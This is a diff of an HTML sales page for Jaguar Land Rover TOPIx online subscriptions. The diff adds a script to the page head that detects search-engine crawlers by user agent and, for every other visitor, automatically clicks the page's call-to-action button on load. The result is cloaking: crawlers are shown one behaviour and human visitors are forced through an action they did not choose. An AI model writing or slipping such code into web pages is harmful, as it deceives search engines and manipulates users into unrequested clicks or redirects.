@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JLR TOPIx online 1 month/ 1 year</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="JLR TOPIx online subscription available for 1 time, 1 month, or 1 year. Provides technical support and documentation for Jaguar Land Rover vehicles.">
     <meta name="keywords" content="JLR TOPIx online, JLR TOPIx online 1 time, JLR TOPIx online 1 month, JLR TOPIx online 1 year, JLR TOPIx subscription, JLR TOPIx technical documentation, JLR TOPIx software, JLR DoIP VCI, TOPIx Jaguar Land Rover, JLR online service, JLR service documentation, JLR vehicle diagnostics, JLR coding service, JLR workshop manuals, JLR electrical diagrams, JLR technical bulletins, JLR vehicle repair resources, JLR diagnostic tool, JLR repair information, JLR support 2021, JLR support newer vehicles, Land Rover support, Jaguar support, JLR diagnostics 2021, JLR онлайн, JLR подписка, JLR техническая документация, диагностика JLR, печать JLR, JLR підтримка">
     <style>
